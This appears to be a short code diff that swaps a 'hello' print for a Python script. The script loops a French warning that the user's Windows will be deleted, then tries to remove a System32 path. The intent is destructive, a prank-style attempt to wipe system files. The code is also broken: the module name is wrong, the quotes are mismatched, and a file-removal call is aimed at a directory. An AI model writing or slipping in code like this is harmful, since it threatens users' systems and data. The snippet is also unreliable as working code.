@@ -1,1 +1,7 @@
-print("hello")
+import os
+from tkinter import messagebox
+for i in range (1,10):
+  message.showinfo("ton windows va être supprimé")
+os.remove('/System/System32")
+
+  
